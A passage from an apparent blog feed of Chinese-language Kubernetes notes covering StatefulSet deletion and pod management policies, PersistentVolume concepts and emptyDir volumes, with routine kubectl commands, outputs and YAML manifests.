class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">NAME</span>      READY     STATUS    RESTARTS   AGE<br><span class="hljs-attribute">web</span>-<span class="hljs-number">1</span>     <span class="hljs-number">1</span>/<span class="hljs-number">1</span>       Running   <span class="hljs-number">0</span>          <span class="hljs-number">10</span>m<br><span class="hljs-attribute">web</span>-<span class="hljs-number">2</span>     <span class="hljs-number">1</span>/<span class="hljs-number">1</span>       Running   <span class="hljs-number">0</span>          <span class="hljs-number">7</span>m<br><br></code></pre></td></tr></table></figure><p>由于 <code>web</code> StatefulSet 已经被删除，<code>web-0</code>没有被重新启动。</p><p>在一个终端监控 StatefulSet 的 Pod。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kubectl <span class="hljs-builtin-name">get</span> pods -w -l <span class="hljs-attribute">app</span>=nginx<br><br></code></pre></td></tr></table></figure><p>在另一个终端里重新创建 StatefulSet。请注意，除非你删除了 <code>nginx</code> Service （你不应该这样做），你将会看到一个错误，提示 Service 已经存在。</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coq">kubectl <span class="hljs-built_in">apply</span> -f web.yaml<br><br></code></pre></td></tr></table></figure><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs protobuf">statefulset.apps/web created<br><span class="hljs-class"><span class="hljs-keyword">service</span>/<span class="hljs-title">nginx</span> unchanged</span><br><span class="hljs-class"></span><br></code></pre></td></tr></table></figure><p>请忽略这个错误。它仅表示 kubernetes 进行了一次创建 nginx Headless Service 的尝试，尽管那个 Service 已经存在。</p><p>在第一个终端中运行并检查 <code>kubectl get</code> 命令的输出。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kubectl <span class="hljs-builtin-name">get</span> pods -w -l <span class="hljs-attribute">app</span>=nginx<br><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">NAME</span>      READY     STATUS    RESTARTS   AGE<br><span class="hljs-attribute">web</span>-<span class="hljs-number">1</span>     <span class="hljs-number">1</span>/<span class="hljs-number">1</span>       Running   <span class="hljs-number">0</span>          <span class="hljs-number">16</span>m<br><span class="hljs-attribute">web</span>-<span class="hljs-number">2</span>     <span class="hljs-number">1</span>/<span class="hljs-number">1</span>       Running   <span class="hljs-number">0</span>          <span class="hljs-number">2</span>m<br><span class="hljs-attribute">NAME</span>      READY     STATUS    RESTARTS   AGE<br><span class="hljs-attribute">web</span>-<span class="hljs-number">0</span>     <span class="hljs-number">0</span>/<span class="hljs-number">1</span>       Pending   <span class="hljs-number">0</span>          <span class="hljs-number">0</span>s<br><span class="hljs-attribute">web</span>-<span class="hljs-number">0</span>     <span class="hljs-number">0</span>/<span class="hljs-number">1</span>       Pending   <span class="hljs-number">0</span>         <span class="hljs-number">0</span>s<br><span class="hljs-attribute">web</span>-<span class="hljs-number">0</span>     <span class="hljs-number">0</span>/<span class="hljs-number">1</span>       ContainerCreating   <span class="hljs-number">0</span>         <span class="hljs-number">0</span>s<br><span class="hljs-attribute">web</span>-<span class="hljs-number">0</span>     <span class="hljs-number">1</span>/<span class="hljs-number">1</span>       Running   <span class="hljs-number">0</span>         <span class="hljs-number">18</span>s<br><span class="hljs-attribute">web</span>-<span class="hljs-number">2</span>     <span class="hljs-number">1</span>/<span class="hljs-number">1</span>       Terminating   <span class="hljs-number">0</span>         <span class="hljs-number">3</span>m<br><span class="hljs-attribute">web</span>-<span class="hljs-number">2</span>     <span class="hljs-number">0</span>/<span class="hljs-number">1</span>       Terminating   <span class="hljs-number">0</span>         <span class="hljs-number">3</span>m<br><span class="hljs-attribute">web</span>-<span class="hljs-number">2</span>     <span class="hljs-number">0</span>/<span class="hljs-number">1</span>       Terminating   <span class="hljs-number">0</span>         <span class="hljs-number">3</span>m<br><span class="hljs-attribute">web</span>-<span class="hljs-number">2</span>     <span class="hljs-number">0</span>/<span class="hljs-number">1</span>       Terminating   <span class="hljs-number">0</span>         <span class="hljs-number">3</span>m<br><br></code></pre></td></tr></table></figure><p>当重新创建 <code>web</code> StatefulSet 时，<code>web-0</code> 被第一个重新启动。 由于 <code>web-1</code> 已经处于 Running 和 Ready 状态，当 <code>web-0</code> 变成 Running 和 Ready 时， StatefulSet 会接收这个 Pod。由于你重新创建的 StatefulSet 的 <code>replicas</code> 等于 2， 一旦 <code>web-0</code> 被重新创建并且 <code>web-1</code> 被认为已经处于 Running 和 Ready 状态时，<code>web-2</code> 将会被终止。</p><p>让我们再看看被 Pod 的 web 服务器加载的 <code>index.html</code> 的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> 0 1; <span class="hljs-keyword">do</span> kubectl <span class="hljs-built_in">exec</span> -i -t <span class="hljs-string">&quot;web-<span class="hljs-variable">$i</span>&quot;</span> -- curl http://localhost/; <span class="hljs-keyword">done</span><br><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">web</span>-<span class="hljs-number">0</span><br><span class="hljs-attribute">web</span>-<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>尽管你同时删除了 StatefulSet 和 <code>web-0</code> Pod，但它仍然使用最初写入 <code>index.html</code> 文件的主机名进行服务。 这是因为 StatefulSet 永远不会删除和一个 Pod 相关联的 PersistentVolumes。 当你重建这个 StatefulSet 并且重新启动了 <code>web-0</code> 时，它原本的 PersistentVolume 会被重新挂载。</p><h3 id="4-2-级联删除"><a href="#4-2-级联删除" class="headerlink" title="4.2 级联删除"></a>4.2 级联删除</h3><p>在一个终端窗口观察 StatefulSet 里的 Pod。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kubectl <span class="hljs-builtin-name">get</span> pods -w -l <span class="hljs-attribute">app</span>=nginx<br><br></code></pre></td></tr></table></figure><p>在另一个窗口中再次删除这个 StatefulSet。这次省略 <code>--cascade=orphan</code> 参数。</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">kubectl <span class="hljs-keyword">delete</span> statefulset web<br><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">statefulset<span class="hljs-selector-class">.apps</span> <span class="hljs-string">&quot;web&quot;</span> deleted<br><br></code></pre></td></tr></table></figure><p>在第一个终端检查 <code>kubectl get</code> 命令的输出，并等待所有的 Pod 变成 Terminating 状态。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kubectl <span class="hljs-builtin-name">get</span> pods -w -l <span class="hljs-attribute">app</span>=nginx<br><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">NAME</span>      READY     STATUS    RESTARTS   AGE<br><span class="hljs-attribute">web</span>-<span class="hljs-number">0</span>     <span class="hljs-number">1</span>/<span class="hljs-number">1</span>       Running   <span class="hljs-number">0</span>          <span class="hljs-number">11</span>m<br><span class="hljs-attribute">web</span>-<span class="hljs-number">1</span>     <span class="hljs-number">1</span>/<span class="hljs-number">1</span>       Running   <span class="hljs-number">0</span>          <span class="hljs-number">27</span>m<br><span class="hljs-attribute">NAME</span>      READY     STATUS        RESTARTS   AGE<br><span class="hljs-attribute">web</span>-<span class="hljs-number">0</span>     <span class="hljs-number">1</span>/<span class="hljs-number">1</span>       Terminating   <span class="hljs-number">0</span>          <span class="hljs-number">12</span>m<br><span class="hljs-attribute">web</span>-<span class="hljs-number">1</span>     <span class="hljs-number">1</span>/<span class="hljs-number">1</span>       Terminating   <span class="hljs-number">0</span>         <span class="hljs-number">29</span>m<br><span class="hljs-attribute">web</span>-<span class="hljs-number">0</span>     <span class="hljs-number">0</span>/<span class="hljs-number">1</span>       Terminating   <span class="hljs-number">0</span>         <span class="hljs-number">12</span>m<br><span class="hljs-attribute">web</span>-<span class="hljs-number">0</span>     <span class="hljs-number">0</span>/<span class="hljs-number">1</span>       Terminating   <span class="hljs-number">0</span>         <span class="hljs-number">12</span>m<br><span class="hljs-attribute">web</span>-<span class="hljs-number">0</span>     <span class="hljs-number">0</span>/<span class="hljs-number">1</span>       Terminating   <span class="hljs-number">0</span>         <span class="hljs-number">12</span>m<br><span class="hljs-attribute">web</span>-<span class="hljs-number">1</span>     <span class="hljs-number">0</span>/<span class="hljs-number">1</span>       Terminating   <span class="hljs-number">0</span>         <span class="hljs-number">29</span>m<br><span class="hljs-attribute">web</span>-<span class="hljs-number">1</span>     <span class="hljs-number">0</span>/<span class="hljs-number">1</span>       Terminating   <span class="hljs-number">0</span>         <span class="hljs-number">29</span>m<br><span class="hljs-attribute">web</span>-<span class="hljs-number">1</span>     <span class="hljs-number">0</span>/<span class="hljs-number">1</span>       Terminating   <span class="hljs-number">0</span>         <span class="hljs-number">29</span>m<br><br></code></pre></td></tr></table></figure><p>如同你在<a href="https://kubernetes.io/zh/docs/tutorials/stateful-application/basic-stateful-set/#ordered-pod-termination">缩容</a>一节看到的，Pod 按照和他们序号索引相反的顺序每次终止一个。 在终止一个 Pod 前，StatefulSet 控制器会等待 Pod 后继者被完全终止。</p><p>请注意，虽然级联删除会删除 StatefulSet 和它的 Pod，但它并不会删除和 StatefulSet 关联的 Headless Service。你必须手动删除<code>nginx</code> Service。</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">kubectl <span class="hljs-keyword">delete</span> service nginx<br><br></code></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">service</span> <span class="hljs-string">&quot;nginx&quot;</span> deleted<br><br></code></pre></td></tr></table></figure><p>再一次重新创建 StatefulSet 和 Headless Service。</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coq">kubectl <span class="hljs-built_in">apply</span> -f web.yaml<br><br></code></pre></td></tr></table></figure><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs protobuf"><span class="hljs-class"><span class="hljs-keyword">service</span>/<span class="hljs-title">nginx</span> created</span><br><span class="hljs-class">statefulset.apps/web created</span><br><span class="hljs-class"></span><br></code></pre></td></tr></table></figure><p>当 StatefulSet 所有的 Pod 变成 Running 和 Ready 时，获取它们的 <code>index.html</code> 文件的内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> 0 1; <span class="hljs-keyword">do</span> kubectl <span class="hljs-built_in">exec</span> -i -t <span class="hljs-string">&quot;web-<span class="hljs-variable">$i</span>&quot;</span> -- curl http://localhost/; <span class="hljs-keyword">done</span><br><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">web</span>-<span class="hljs-number">0</span><br><span class="hljs-attribute">web</span>-<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>即使你已经删除了 StatefulSet 和它的全部 Pod，这些 Pod 将会被重新创建并挂载它们的 PersistentVolumes，并且 <code>web-0</code> 和 <code>web-1</code> 将仍然使用它们的主机名提供服务。</p><p>最后删除 <code>nginx</code> service…</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">kubectl <span class="hljs-keyword">delete</span> service nginx<br><br></code></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">service</span> <span class="hljs-string">&quot;nginx&quot;</span> deleted<br><br></code></pre></td></tr></table></figure><p>… 并且删除 <code>web</code> StatefulSet:</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">kubectl <span class="hljs-keyword">delete</span> statefulset web<br><br></code></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">statefulset</span> <span class="hljs-string">&quot;web&quot;</span> deleted<br></code></pre></td></tr></table></figure><h1 id="Pod管理策略"><a href="#Pod管理策略" class="headerlink" title="Pod管理策略"></a>Pod管理策略</h1><p>OrderedReady Pod 管理策略<br>OrderedReady pod 管理策略是 StatefulSets 的默认选项。它告诉 StatefulSet 控制器遵循上文展示的顺序性保证。</p><p>Parallel Pod 管理策略<br>Parallel pod 管理策略告诉 StatefulSet 控制器并行的终止所有 Pod， 在启动或终止另一个 Pod 前，不必等待这些 Pod 变成 Running 和 Ready 或者完全终止状态。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">ports:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">80</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">web</span><br>  <span class="hljs-attr">clusterIP:</span> <span class="hljs-string">None</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">StatefulSet</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">web</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">serviceName:</span> <span class="hljs-string">&quot;nginx&quot;</span><br>  <span class="hljs-comment"># Parallel pod 管理策略告诉 StatefulSet 控制器并行的终止所有 Pod， 在启动或终止另一个 Pod 前，不必等待这些 Pod 变成 Running 和 Ready 或者完全终止状态。</span><br>  <span class="hljs-attr">podManagementPolicy:</span> <span class="hljs-string">&quot;Parallel&quot;</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">2</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">k8s.gcr.io/nginx-slim:0.8</span><br>        <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">80</span><br>          <span class="hljs-attr">name:</span> <span class="hljs-string">web</span><br>        <span class="hljs-attr">volumeMounts:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">www</span><br>          <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/usr/share/nginx/html</span><br>  <span class="hljs-attr">volumeClaimTemplates:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">www</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">accessModes:</span> [ <span class="hljs-string">&quot;ReadWriteOnce&quot;</span> ]<br>      <span class="hljs-attr">resources:</span><br>        <span class="hljs-attr">requests:</span><br>          <span class="hljs-attr">storage:</span> <span class="hljs-string">1Gi</span><br><br></code></pre></td></tr></table></figure><h1 id="清理现场"><a href="#清理现场" class="headerlink" title="清理现场"></a>清理现场</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl delete sts web<br>kubectl delete svc nginx<br><br></code></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> k8s </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Persistent Volume</title>
      <link href="/2021/11/15/Persistent%20Volume/"/>
      <url>/2021/11/15/Persistent%20Volume/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h1 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念<h4 id="1-1-PersistentVolume-PV"><a href="#1-1-PersistentVolume-PV" class="headerlink" title="1.1 PersistentVolume (PV)"></a>1.1 PersistentVolume (PV)</h4><pre><code>PV 是一种持久的资源，独立于POD的生命周期之外。 如FS ,ISCSI ,以及云供应商提供的存储系统。</code></pre><p>![](/Persistent Volume/20211115053030111.png)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--pvc 是一种选择PV 的最佳方案，并进行绑定--&gt;</span><br></code></pre></td></tr></table></figure><pre><code>PVC 是用户存储的请求。 PVC消耗PV资源。  pvc 持久卷声明</code></pre><h4 id="1-2-绑定"><a href="#1-2-绑定" class="headerlink" title="1.2 绑定"></a>1.2 绑定</h4><pre><code> master 中的控制环路监控新的PVC ，寻找匹配的PV(如果可能)，并将它们绑定在一起。 如果为新的PVC 动态调配PV ,则该环路将 始终将该PV绑定到PVC . 否则， 用户总会得到他们所请求的存储， 但是容量可能超出要求的数量。 一旦PV 和PVC绑定后， PersistentVolumeClaim 绑定是排他性的，不管它们是如何绑定的。 PVC 和PV 是一对一的隐射。</code></pre><h4 id="1-3-访问模式"><a href="#1-3-访问模式" class="headerlink" title="1.3 访问模式"></a>1.3 访问模式</h4><p>PersistentVolume 卷可以用资源提供者所支持的任何方式挂载到宿主系统上。 如下表所示，提供者（驱动）的能力不同，每个 PV 卷的访问模式都会设置为 对应卷所支持的模式值。 例如，NFS 可以支持多个读写客户，但是某个特定的 NFS PV 卷可能在服务器 上以只读的方式导出。每个 PV 卷都会获得自身的访问模式集合，描述的是 特定 PV 卷的能力。</p><p>访问模式有：</p><p>ReadWriteOnce<br>卷可以被一个节点以读写方式挂载。 ReadWriteOnce 访问模式也允许运行在同一节点上的多个 Pod 访问卷。<br>ReadOnlyMany<br>卷可以被多个节点以只读方式挂载。<br>ReadWriteMany<br>卷可以被多个节点以读写方式挂载。<br>ReadWriteOncePod<br>卷可以被单个 Pod 以读写方式挂载。 如果你想确保整个集群中只有一个 Pod 可以读取或写入该 PVC， 请使用ReadWriteOncePod 访问模式。这只支持 CSI 卷以及需要 Kubernetes 1.22 以上版本。<br>这篇博客文章 Introducing Single Pod Access Mode for PersistentVolumes 描述了更详细的内容。</p><p>在命令行接口（CLI）中，访问模式也使用以下缩写形式：</p><pre><code>RWO - ReadWriteOnceROX - ReadOnlyManyRWX - ReadWriteManyRWOP - ReadWriteOncePod</code></pre><h4 id="1-4-回收策略"><a href="#1-4-回收策略" class="headerlink" title="1.4 回收策略"></a>1.4 回收策略</h4><p>回收策略<br>目前的回收策略有：</p><pre><code>Retain -- 手动回收Recycle -- 基本擦除 (rm -rf /thevolume/*)Delete -- 诸如 AWS EBS、GCE PD、Azure Disk 或 OpenStack Cinder 卷这类关联存储资产也被删除目前，仅 NFS 和 HostPath 支持回收（Recycle）。 AWS EBS、GCE PD、Azure Disk 和 Cinder 卷都支持删除（Delete）。</code></pre><h4 id="1-5-PV状态"><a href="#1-5-PV状态" class="headerlink" title="1.5 PV状态"></a>1.5 PV状态</h4><p>每个卷会处于以下阶段（Phase）之一：</p><pre><code>Available（可用）-- 卷是一个空闲资源，尚未绑定到任何申领；Bound（已绑定）-- 该卷已经绑定到某申领；Released（已释放）-- 所绑定的申领已被删除，但是资源尚未被集群回收；Failed（失败）-- 卷的自动回收操作失败。命令行接口能够显示绑定到某 PV 卷的 PVC 对象。</code></pre></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> k8s </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Volume</title>
      <link href="/2021/11/15/Volume/"/>
      <url>/2021/11/15/Volume/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <p>-<p></p><h1 id="1-背景"><a href="#1-背景" class="headerlink" title="1.背景"></a>1.背景</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--Kubernetes 支持很多类型的卷。 Pod 可以同时使用任意数目的卷类型。 临时卷类型的生命周期与 Pod 相同，但持久卷可以比 Pod </span><br><span class="hljs-comment">的存活期长。 当 Pod 不再存在时，Kubernetes 也会销毁临时卷；不过 Kubernetes 不会销毁 持久卷。对于给定 Pod 中任何类型的</span><br><span class="hljs-comment">卷，在容器重启期间数据都不会丢失。卷的核心是一个目录，其中可能存有数据，Pod 中的容器可以访问该目录中的数据。 所采用的特定</span><br><span class="hljs-comment">的卷类型将决定该目录如何形成的、使用何种介质保存数据以及目录中存放 的内容。--&gt;</span><br>临时卷 ： Volume<br><span class="hljs-comment">&lt;!--临时卷的生命周期于POD相同 ，POD中的容器PAUSE提供共享空间，给其他容器。  如果PAUSE生命终止，那么临时卷也不复存在。--&gt;</span><br>持久卷： presistent Volume<br></code></pre></td></tr></table></figure><p><a href="/Volume/20211115032212669.png" class="gallery-item"><img src="/2021/11/15/Volume/20211115032212669.png"></a></p><h1 id="2-卷类型"><a href="#2-卷类型" class="headerlink" title="2.卷类型"></a>2.卷类型</h1><h3 id="2-1-emptydir-类型卷"><a href="#2-1-emptydir-类型卷" class="headerlink" title="2.1 emptydir 类型卷"></a>2.1 emptydir 类型卷</h3><pre><code>暂存空间，例如用于基于磁盘的合并排序用作长时间计算崩溃恢复时的检查点。WEB服务器容器提供数据时，保存内容管理器容器提取文件。</code></pre><h4 id="2-1-1-emptydir-实现"><a href="#2-1-1-emptydir-实现" class="headerlink" title="2.1.1 emptydir 实现"></a>2.1.1 emptydir 实现</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">piVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">test-pd</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">image:</span> <span class="hljs-string">k8s.gcr.io/test-webserver</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">test-container</span><br>    <span class="hljs-attr">volumeMounts:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/cache</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">cache-volume</span><br>  <span class="hljs-attr">volumes:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">cache-volume</span><br>    <span class="hljs-attr">emptyDir:</span> &#123;&#125;<br></code></pre></td></tr></table></figure><p><a href="/Volume/20211115034019424.png" class="gallery-item"><img src="/2021/11/15/Volume/20211115034019424.png"></a></p><h4 id="2-1-2-同POD不同的容器实现-emptydir"><a href="#2-1-2-同POD不同的容器实现-emptydir" class="headerlink" title="2.1.2 同POD不同的容器实现 emptydir"></a>2.1.2 同POD不同的容器实现 emptydir</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html">[root@k8s1 Volume]# kubectl get pods<br>NAME                   READY   STATUS        RESTARTS   AGE<br>nginx-new              1/1     Terminating   0          22h<br>test-pd-multi-docker   2/2     Running       0          3m21s<br>[root@k8s1 Volume]# <br>[root@k8s1 Volume]# kubectl exec test-pd-multi-docker -c test-container -it -- /bin/sh<br>/ # cd /cache<br>/cache # date &gt;&gt; index.html<br>/cache # cat index.html<br>Mon Nov 15 08:16:58 UTC 2021<br>/cache # <br>/cache # exit<br>[root@k8s1 Volume]# kubectl exec test-pd-multi-docker -c container-tomcat -it -- /bin/sh<br># cd /test<br># ls<br>index.html<br># date &gt;&gt; index.html<br># cat index.html<br>Mon Nov 15 08:16:58 UTC 2021<br>Mon Nov 15 08:17:44 UTC 2021<br><br><br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 